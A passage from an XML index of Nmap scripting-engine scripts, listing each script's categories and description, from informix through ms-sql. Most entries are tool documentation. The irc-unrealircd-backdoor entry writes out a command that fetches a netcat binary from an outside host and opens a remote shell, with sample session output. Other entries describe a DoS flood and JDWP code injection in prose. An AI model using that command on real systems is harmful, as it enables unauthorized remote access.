<description>Runs a query against IBM Informix Dynamic Server using the given&#xa;authentication credentials (see also: informix-brute).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\informix-tables.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Retrieves a list of tables and column definitions for each database on an Informix server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-forwarding.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Detects whether the remote device has ip forwarding or &quot;Internet connection&#xa;sharing&quot; enabled, by sending an ICMP echo request to a given target using&#xa;the scanned host as default gateway.&#xa;&#xa;The given target can be a routed or a LAN host and needs to be able to respond&#xa;to ICMP requests (ping) in order for the test to be successful. In addition,&#xa;if the given target is a routed host, the scanned host needs to have the proper&#xa;routing to reach it.&#xa;&#xa;In order to use the scanned host as default gateway Nmap needs to discover&#xa;the MAC address. This requires Nmap to be run in privileged mode and the host&#xa;to be on the LAN.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-geoplugin.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Tries to identify the physical location of an IP address using the&#xa;Geoplugin geolocation web service (http://www.geoplugin.com/). There&#xa;is no limit on lookups using this service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-ipinfodb.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Tries to identify the physical location of an IP address using the&#xa;IPInfoDB geolocation web service&#xa;(http://ipinfodb.com/ip_location_api.php).&#xa;&#xa;There is no limit on requests to this service. However, the API key&#xa;needs to be obtained through free registration for this service:&#xa;&lt;code&gt;http://ipinfodb.com/login.php&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-map-bing.nse">
<categories><category>external</category><category>safe</category></categories>
<description>This script queries the Nmap registry for the GPS coordinates of targets stored&#xa;by previous geolocation scripts and renders a Bing Map of markers representing&#xa;the targets.&#xa;&#xa;The Bing Maps REST API has a limit of 100 markers, so if more coordinates are&#xa;found, only the top 100 markers by number of IPs will be shown.&#xa;&#xa;Additional information for the Bing Maps REST Services API can be found at:&#xa;- https://msdn.microsoft.com/en-us/library/ff701724.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-map-google.nse">
<categories><category>external</category><category>safe</category></categories>
<description>This script queries the Nmap registry for the GPS coordinates of targets stored&#xa;by previous geolocation scripts and renders a Google Map of markers representing&#xa;the targets.&#xa;&#xa;Additional information for the Google Static Maps API can be found at:&#xa;- https://developers.google.com/maps/documentation/static-maps/intro&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-map-kml.nse">
<categories><category>safe</category></categories>
<description>This script queries the Nmap registry for the GPS coordinates of targets stored&#xa;by previous geolocation scripts and produces a KML file of points representing&#xa;the targets.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-geolocation-maxmind.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Tries to identify the physical location of an IP address using a&#xa;Geolocation Maxmind database file (available from&#xa;http://www.maxmind.com/app/ip-location). This script supports queries&#xa;using all Maxmind databases that are supported by their API including&#xa;the commercial ones.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ip-https-discover.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Checks if the IP over HTTPS (IP-HTTPS) Tunneling Protocol [1] is supported.&#xa;&#xa;IP-HTTPS sends Teredo related IPv6 packets over an IPv4-based HTTPS session. This&#xa;indicates that Microsoft DirectAccess [2], which allows remote clients to access&#xa;intranet resources on a domain basis, is supported. Windows clients need&#xa;Windows 7 Enterprise/Ultime or Windows 8.1 Enterprise/Ultimate. Servers need&#xa;Windows Server 2008 (R2) or Windows Server 2012 (R2). Older versions&#xa;of Windows and Windows Server are not supported.&#xa;&#xa;[1] http://msdn.microsoft.com/en-us/library/dd358571.aspx&#xa;[2] http://technet.microsoft.com/en-us/network/dd420463.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipidseq.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Classifies a host&apos;s IP ID sequence (test for susceptibility to idle&#xa;scan).&#xa;&#xa;Sends six probes to obtain IP IDs from the target and classifies them&#xa;similarly to Nmap&apos;s method.  This is useful for finding suitable zombies&#xa;for Nmap&apos;s idle scan (&lt;code&gt;-sI&lt;/code&gt;) as Nmap itself doesn&apos;t provide a way to scan&#xa;for these hosts.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipmi-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against IPMI RPC server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipmi-cipher-zero.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>  IPMI 2.0 Cipher Zero Authentication Bypass Scanner. This module identifies IPMI 2.0&#xa;  compatible systems that are vulnerable to an authentication bypass vulnerability&#xa;  through the use of cipher zero.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipmi-version.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>  Performs IPMI Information Discovery through Channel Auth probes.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipv6-multicast-mld-list.nse">
<categories><category>broadcast</category><category>discovery</category></categories>
<description>Uses Multicast Listener Discovery to list the multicast addresses subscribed to&#xa;by IPv6 multicast listeners on the link-local scope. Addresses in the IANA IPv6&#xa;Multicast Address Space Registry have their descriptions listed.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipv6-node-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Obtains hostnames, IPv4 and IPv6 addresses through IPv6 Node Information Queries.&#xa;&#xa;IPv6 Node Information Queries are defined in RFC 4620. There are three&#xa;useful types of queries:&#xa;* qtype=2: Node Name&#xa;* qtype=3: Node Addresses&#xa;* qtype=4: IPv4 Addresses&#xa;&#xa;Some operating systems (Mac OS X and OpenBSD) return hostnames in&#xa;response to qtype=4, IPv4 Addresses. In this case, the hostnames are still&#xa;shown in the &quot;IPv4 addresses&quot; output row, but are prefixed by &quot;(actually&#xa;hostnames)&quot;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ipv6-ra-flood.nse">
<categories><category>dos</category><category>intrusive</category></categories>
<description>Generates a flood of Router Advertisements (RA) with random source MAC&#xa;addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration&#xa;enabled by default (every major OS), will start to compute IPv6 suffix and&#xa;update their routing table to reflect the accepted announcement. This will&#xa;cause 100% CPU usage on Windows and platforms, preventing to process other&#xa;application requests.&#xa;&#xa;Vulnerable platforms:&#xa;* All Cisco IOS ASA with firmware &lt; November 2010&#xa;* All Netscreen versions supporting IPv6&#xa;* Windows 2000/XP/2003/Vista/7/2008/8/2012&#xa;* All FreeBSD versions&#xa;* All NetBSD versions&#xa;* All Solaris/Illumos versions&#xa;&#xa;Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt&#xa;&#xa;WARNING: This script is dangerous and is very likely to bring down a server or&#xa;network appliance.  It should not be run in a production environment unless you&#xa;(and, more importantly, the business) understand the risks!&#xa;&#xa;Additional documents: https://tools.ietf.org/rfc/rfc6104.txt&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\irc-botnet-channels.nse">
<categories><category>discovery</category><category>vuln</category><category>safe</category></categories>
<description>Checks an IRC server for channels that are commonly used by malicious botnets.&#xa;&#xa;Control the list of channel names with the &lt;code&gt;irc-botnet-channels.channels&lt;/code&gt;&#xa;script argument. The default list of channels is&#xa;* loic&#xa;* Agobot&#xa;* Slackbot&#xa;* Mytob&#xa;* Rbot&#xa;* SdBot&#xa;* poebot&#xa;* IRCBot&#xa;* VanBot&#xa;* MPack&#xa;* Storm&#xa;* GTbot&#xa;* Spybot&#xa;* Phatbot&#xa;* Wargbot&#xa;* RxBot&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\irc-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against IRC (Internet Relay Chat) servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\irc-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Gathers information from an IRC server.&#xa;&#xa;It uses STATS, LUSERS, and other queries to obtain this information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\irc-sasl-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against IRC (Internet Relay Chat) servers supporting SASL authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\irc-unrealircd-backdoor.nse">
<categories><category>exploit</category><category>intrusive</category><category>malware</category><category>vuln</category></categories>
<description>Checks if an IRC server is backdoored by running a time-based command (ping)&#xa;and checking how long it takes to respond.&#xa;&#xa;The &lt;code&gt;irc-unrealircd-backdoor.command&lt;/code&gt; script argument can be used to&#xa;run an arbitrary command on the remote system. Because of the nature of&#xa;this vulnerability (the output is never returned) we have no way of&#xa;getting the output of the command. It can, however, be used to start a&#xa;netcat listener as demonstrated here:&#xa;&lt;code&gt;&#xa;  $ nmap -d -p6667 -&#45;script=irc-unrealircd-backdoor.nse -&#45;script-args=irc-unrealircd-backdoor.command=&apos;wget http://www.javaop.com/~ron/tmp/nc &amp;&amp; chmod +x ./nc &amp;&amp; ./nc -l -p 4444 -e /bin/sh&apos; &lt;target&gt;&#xa;  $ ncat -vv localhost 4444&#xa;  Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )&#xa;  Ncat: Connected to 127.0.0.1:4444.&#xa;  pwd&#xa;  /home/ron/downloads/Unreal3.2-bad&#xa;  whoami&#xa;  ron&#xa;&lt;/code&gt;&#xa;&#xa;Metasploit can also be used to exploit this vulnerability.&#xa;&#xa;In addition to running arbitrary commands, the&#xa;&lt;code&gt;irc-unrealircd-backdoor.kill&lt;/code&gt; script argument can be passed, which&#xa;simply kills the UnrealIRCd process.&#xa;&#xa;&#xa;Reference:&#xa;* http://seclists.org/fulldisclosure/2010/Jun/277&#xa;* http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt&#xa;* http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\iscsi-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against iSCSI targets.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\iscsi-info.nse">
<categories><category>default</category><category>safe</category><category>discovery</category></categories>
<description>Collects and displays information from remote iSCSI targets.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\isns-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Lists portals and iSCSI nodes registered with the Internet Storage Name&#xa;Service (iSNS).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\jdwp-exec.nse">
<categories><category>exploit</category><category>intrusive</category></categories>
<description>Attempts to exploit java&apos;s remote debugging port. When remote debugging&#xa;port is left open, it is possible to inject java bytecode and achieve&#xa;remote code execution.  This script abuses this to inject and execute&#xa;a Java class file that executes the supplied shell command and returns&#xa;its output.&#xa;&#xa;The script injects the JDWPSystemInfo class from&#xa;nselib/jdwp-class/ and executes its run() method which&#xa;accepts a shell command as its argument.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\jdwp-info.nse">
<categories><category>default</category><category>safe</category><category>discovery</category></categories>
<description>Attempts to exploit java&apos;s remote debugging port.  When remote&#xa;debugging port is left open, it is possible to inject java bytecode&#xa;and achieve remote code execution.  This script injects and execute a&#xa;Java class file that returns remote system information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\jdwp-inject.nse">
<categories><category>exploit</category><category>intrusive</category></categories>
<description>Attempts to exploit java&apos;s remote debugging port.  When remote debugging port&#xa;is left open, it is possible to inject  java bytecode and achieve remote code&#xa;execution.  This script allows injection of arbitrary class files.&#xa;&#xa;After injection, class&apos; run() method is executed.&#xa;Method run() has no parameters, and is expected to return a string.&#xa;&#xa;You must specify your own .class file to inject by &lt;code&gt;filename&lt;/code&gt; argument.&#xa;See nselib/data/jdwp-class/README for more.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\jdwp-version.nse">
<categories><category>version</category></categories>
<description>Detects the Java Debug Wire Protocol. This protocol is used by Java programs&#xa;to be debugged via the network. It should not be open to the public Internet,&#xa;as it does not provide any security against malicious attackers who can inject&#xa;their own bytecode into the debugged process.&#xa;&#xa;Documentation for JDWP is available at&#xa;http://java.sun.com/javase/6/docs/technotes/guides/jpda/jdwp-spec.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\knx-gateway-discover.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Discovers KNX gateways by sending a KNX Search Request to the multicast address&#xa;224.0.23.12 including a UDP payload with destination port 3671. KNX gateways&#xa;will respond with a KNX Search Response including various information about the&#xa;gateway, such as KNX address and supported services.&#xa;&#xa;Further information:&#xa;  * DIN EN 13321-2&#xa;  * http://www.knx.org/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\knx-gateway-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Identifies a KNX gateway on UDP port 3671 by sending a KNX Description Request.&#xa;&#xa;Further information:&#xa;  * DIN EN 13321-2&#xa;  * http://www.knx.org/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\krb5-enum-users.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Discovers valid usernames by brute force querying likely usernames against a Kerberos service.&#xa;When an invalid username is requested the server will respond using the&#xa;Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine&#xa;that the user name was invalid. Valid user names will illicit either the&#xa;TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling&#xa;that the user is required to perform pre authentication.&#xa;&#xa;The script should work against Active Directory and ?&#xa;It needs a valid Kerberos REALM in order to operate.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ldap-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to brute-force LDAP authentication. By default&#xa;it uses the built-in username and password lists. In order to use your&#xa;own lists use the &lt;code&gt;userdb&lt;/code&gt; and &lt;code&gt;passdb&lt;/code&gt; script arguments.&#xa;&#xa;This script does not make any attempt to prevent account lockout!&#xa;If the number of passwords in the dictionary exceed the amount of&#xa;allowed tries, accounts will be locked out. This usually happens&#xa;very quickly.&#xa;&#xa;Authenticating against Active Directory using LDAP does not use the&#xa;Windows user name but the user accounts distinguished name. LDAP on Windows&#xa;2003 allows authentication using a simple user name rather than using the&#xa;fully distinguished name. E.g., &quot;Patrik Karlsson&quot; vs.&#xa;&quot;cn=Patrik Karlsson,cn=Users,dc=cqure,dc=net&quot;&#xa;This type of authentication is not supported on e.g. OpenLDAP.&#xa;&#xa;This script uses some AD-specific support and optimizations:&#xa;* LDAP on Windows 2003/2008 reports different error messages depending on whether an account exists or not. If the script receives an error indicating that the username does not exist it simply stops guessing passwords for this account and moves on to the next.&#xa;* The script attempts to authenticate with the username only if no LDAP base is specified. The benefit of authenticating this way is that the LDAP path of each account does not need to be known in advance as it&apos;s looked up by the server.  This technique will only find a match if the account Display Name matches the username being attempted.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ldap-novell-getpass.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve the Novell Universal Password for a user. You&#xa;must already have (and include in script arguments) the username and password for an eDirectory server&#xa;administrative account.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ldap-rootdse.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves the LDAP root DSA-specific Entry (DSE)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ldap-search.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to perform an LDAP search and returns all matches.&#xa;&#xa;If no username and password is supplied to the script the Nmap registry&#xa;is consulted. If the &lt;code&gt;ldap-brute&lt;/code&gt; script has been selected&#xa;and it found a valid account, this account will be used. If not&#xa;anonymous bind will be used as a last attempt.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\lexmark-config.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves configuration information from a Lexmark S300-S400 printer.&#xa;&#xa;The Lexmark S302 responds to the NTPRequest version probe with its&#xa;configuration. The response decodes as mDNS, so the request was modified&#xa;to resemble an mDNS request as close as possible. However, the port&#xa;(9100/udp) is listed as something completely different (HBN3) in&#xa;documentation from Lexmark. See&#xa;http://www.lexmark.com/vgn/images/portal/Security%20Features%20of%20Lexmark%20MFPs%20v1_1.pdf.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\llmnr-resolve.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Resolves a hostname by using the LLMNR (Link-Local Multicast Name Resolution) protocol.&#xa;&#xa;The script works by sending a LLMNR Standard Query containing the hostname to&#xa;the 5355 UDP port on the 224.0.0.252 multicast address. It listens for any&#xa;LLMNR responses that are sent to the local machine with a 5355 UDP source port.&#xa;A hostname to resolve must be provided.&#xa;&#xa;For more information, see:&#xa;* http://technet.microsoft.com/en-us/library/bb878128.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\lltd-discovery.nse">
<categories><category>broadcast</category><category>discovery</category><category>safe</category></categories>
<description>Uses the Microsoft LLTD protocol to discover hosts on a local network.&#xa;&#xa;For more information on the LLTD protocol please refer to&#xa;http://www.microsoft.com/whdc/connect/Rally/LLTD-spec.mspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\lu-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to enumerate Logical Units (LU) of TN3270E servers.&#xa;&#xa;When connecting to a TN3270E server you are assigned a Logical Unit (LU) or you can tell&#xa;the TN3270E server which LU you&apos;d like to use. Typically TN3270E servers are configured to &#xa;give you an LU from a pool of LUs. They can also have LUs set to take you to a specific&#xa;application. This script attempts to guess valid LUs that bypass the default LUs you are&#xa;assigned. For example, if a TN3270E server sends you straight to TPX you could use this&#xa;script to find LUs that take you to TSO, CICS, etc.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\maxdb-info.nse">
<categories><category>default</category><category>version</category><category>safe</category></categories>
<description>Retrieves version and database information from a SAP Max DB database.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mcafee-epo-agent.nse">
<categories><category>version</category><category>safe</category></categories>
<description>Check if ePO agent is running on port 8081 or port identified as ePO Agent port.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\membase-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Couchbase Membase servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\membase-http-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves information (hostname, OS, uptime, etc.) from the CouchBase&#xa;Web Administration port.  The information retrieved by this script&#xa;does not require any credentials.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\memcached-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves information (including system architecture, process ID, and&#xa;server time) from distributed memory object caching system memcached.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\metasploit-info.nse">
<categories><category>intrusive</category><category>safe</category></categories>
<description>Gathers info from the Metasploit rpc service.  It requires a valid login pair.&#xa;After authentication it tries to determine Metasploit version and deduce the OS&#xa;type.  Then it creates a new console and executes few commands to get&#xa;additional info.&#xa;&#xa;References:&#xa;* http://wiki.msgpack.org/display/MSGPACK/Format+specification&#xa;* https://community.rapid7.com/docs/DOC-1516 Metasploit RPC API Guide&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\metasploit-msgrpc-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force username and password auditing against&#xa;Metasploit msgrpc interface.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\metasploit-xmlrpc-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against a Metasploit RPC server using the XMLRPC protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mikrotik-routeros-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Mikrotik RouterOS devices with the API RouterOS interface enabled.&#xa;&#xa;Additional information:&#xa;* http://wiki.mikrotik.com/wiki/API&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mmouse-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the RPA Tech Mobile Mouse&#xa;servers.&#xa;&#xa;The Mobile Mouse server runs on OS X, Windows and Linux and enables remote&#xa;control of the keyboard and mouse from an iOS device. For more information:&#xa;http://mobilemouse.com/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mmouse-exec.nse">
<categories><category>intrusive</category></categories>
<description>Connects to an RPA Tech Mobile Mouse server, starts an application and&#xa;sends a sequence of keys to it. Any application that the user has&#xa;access to can be started and the key sequence is sent to the&#xa;application after it has been started.&#xa;&#xa;The Mobile Mouse server runs on OS X, Windows and Linux and enables remote&#xa;control of the keyboard and mouse from an iOS device. For more information:&#xa;http://mobilemouse.com/&#xa;&#xa;The script has only been tested against OS X and will detect the remote OS&#xa;and abort unless the OS is detected as Mac.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\modbus-discover.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates SCADA Modbus slave ids (sids) and collects their device information.&#xa;&#xa;Modbus is one of the popular SCADA protocols. This script does Modbus device&#xa;information disclosure. It tries to find legal sids (slave ids) of Modbus&#xa;devices and to get additional information about the vendor and firmware. This&#xa;script is improvement of modscan python utility written by Mark Bristow.&#xa;&#xa;Information about MODBUS protocol and security issues:&#xa;* MODBUS application protocol specification:  http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf&#xa;* Defcon 16 Modscan presentation: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-bristow.pdf&#xa;* Modscan utility is hosted at google code: http://code.google.com/p/modscan/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mongodb-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the MongoDB database.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mongodb-databases.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to get a list of tables from a MongoDB database.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mongodb-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to get build info and server status from a MongoDB database.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mqtt-subscribe.nse">
<categories><category>safe</category><category>discovery</category><category>version</category></categories>
<description>Dumps message traffic from MQTT brokers.&#xa;&#xa;This script establishes a connection to an MQTT broker and subscribes&#xa;to the requested topics. The default topics have been chosen to&#xa;receive system information and all messages from other clients. This&#xa;allows Nmap, to listen to all messages being published by clients to&#xa;the MQTT broker.&#xa;&#xa;For additional information:&#xa;* https://en.wikipedia.org/wiki/MQTT&#xa;* https://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mrinfo.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Queries targets for multicast routing information.&#xa;&#xa;This works by sending a DVMRP Ask Neighbors 2 request to the target and&#xa;listening for DVMRP Neighbors 2 responses that are sent back and which contain&#xa;local addresses and the multicast neighbors on each interface of the target. If&#xa;no specific target is specified, the request will be sent to the 224.0.0.1 All&#xa;Hosts multicast address.&#xa;&#xa;This script is similar somehow to the mrinfo utility included with Windows and&#xa;Cisco IOS.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs password guessing against Microsoft SQL Server (ms-sql). Works best in&#xa;conjunction with the &lt;code&gt;broadcast-ms-sql-discover&lt;/code&gt; script.&#xa;&#xa;SQL Server credentials required: No  (will not benefit from &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;).&#xa;&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt; or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt; and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;WARNING: SQL Server 2005 and later versions include support for account lockout&#xa;policies (which are enforced on a per-user basis). If an account is locked out,&#xa;the script will stop running for that instance, unless the&#xa;&lt;code&gt;ms-sql-brute.ignore-lockout&lt;/code&gt; argument is used.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-config.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,&#xa;and configuration settings.&#xa;&#xa;SQL Server credentials required: Yes (use &lt;code&gt;ms-sql-brute&lt;/code&gt;, &lt;code&gt;ms-sql-empty-password&lt;/code&gt;&#xa;and/or &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;)&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-dac.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries the Microsoft SQL Browser service for the DAC (Dedicated Admin&#xa;Connection) port of a given (or all) SQL Server instance. The DAC port&#xa;is used to connect to the database instance when normal connection&#xa;attempts fail, for example, when server is hanging, out of memory or&#xa;in other bad states. In addition, the DAC port provides an admin with&#xa;access to system objects otherwise not accessible over normal&#xa;connections.&#xa;&#xa;The DAC feature is accessible on the loopback adapter per default, but&#xa;can be activated for remote access by setting the &apos;remote admin&#xa;connection&apos; configuration value to 1. In some cases, when DAC has been&#xa;remotely enabled but later disabled, the sql browser service may&#xa;incorrectly report it as available. The script therefore attempts to&#xa;connect to the reported port in order to verify whether it&apos;s&#xa;accessible or not.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-dump-hashes.nse">
<categories><category>auth</category><category>discovery</category><category>safe</category></categories>
<description>Dumps the password hashes from an MS-SQL server in a format suitable for&#xa;cracking by tools such as John-the-ripper. In order to do so the user&#xa;needs to have the appropriate DB privileges.&#xa;&#xa;Credentials passed as script arguments take precedence over credentials&#xa;discovered by other scripts.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-empty-password.nse">
<categories><category>auth</category><category>intrusive</category></categories>
